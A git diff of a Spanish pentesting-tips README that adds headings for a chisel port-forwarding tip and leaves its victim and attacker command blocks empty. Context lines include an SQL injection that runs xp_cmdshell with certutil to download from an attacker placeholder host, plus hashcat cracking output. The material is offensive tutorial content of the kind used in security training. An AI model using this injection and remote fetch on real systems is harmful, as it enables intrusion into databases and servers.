@@ -25,6 +25,7 @@ En este repo quiero contribuir una vez al día, diariamente publicare una técni
 - [Tip 22: Acceso a una maquina mediante autorized_keys](#tip-22-acceso-a-una-maquina-mediante-autorized-keys)
 - [Tip 23: Abuso de SUID para escalar privilegios](#tip-23-abuso-de-suid-para-escalar-privilegios)
 - [Tip 24: Patrones personalizados en Hashcat](#tip-24-patrones-personalizados-en-hashcat)
+- [Tip 25: Port forwarding en Windows con chisel](#tip-25-port-forwarding-en-Windows-con-chisel)
 ## Tip #1: Lectura de archivos desde un XSS
 Al descubrir un XSS se puede realizar la lectura de archivos locales mediante peticiones a un servidor web propio, la idea es enviar el XSS payload a un usuario que si pueda acceder a ciertos archivos del servidor, por ejemplo el archivo .htpasswd, a continuación muestro el payload:
 ```javascript
@@ -790,7 +791,8 @@ Una vez hecho esto podemos ejecutar comandos a nivel de sistema:
 inyeccion';EXEC xp_cmdshell 'certutil -urlcache -f http://10.10.X.X';--
 ```
 Para una mayor información visitar el siguiente enlace: https://www.tarlogic.com/es/blog/red-team-tales-0x01/ , también es comun que los comandos no se ejecuten de forma de "stacked querys"
-
+## Tip #22: Acceso a una maquina mediante autorized_keys
+## Tip #23: Abuso de SUID para escalar privilegios
 ## Tip #24: Patrones personalizados en Hashcat
 Si en algun momento obtienes un hash y ademas conoces el patrón del mismo puedes especificarselo a hashcat para que lo obtenga, por ejemplo veamos el siguiente caso de estudio:
 ### Caso de estudio
@@ -822,3 +824,8 @@ Guess.Queue......: 1/1 (100.00%)
 Speed.#1.........: 99074.4 kH/s (2.14ms) @ Accel:512 Loops:95 Thr:1 Vec:8
 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
 ```
+## Tip #25: Port forwarding en Windows con chisel
+En ocaciones logramos entablar conexion con una maquina remota que corre Windows, siguiento el concepto del **tip #9** buscaremos acceder a servicios que corren en puertos internos, sin embargo que probable que no contemos con SSH, por que utilizaremos chisel, esta disponible en esta repo -> https://github.com/jpillora/chisel. los comandos a ejecutar son los siguientes:
+### Maquina victima
+
+### Maquina atacante
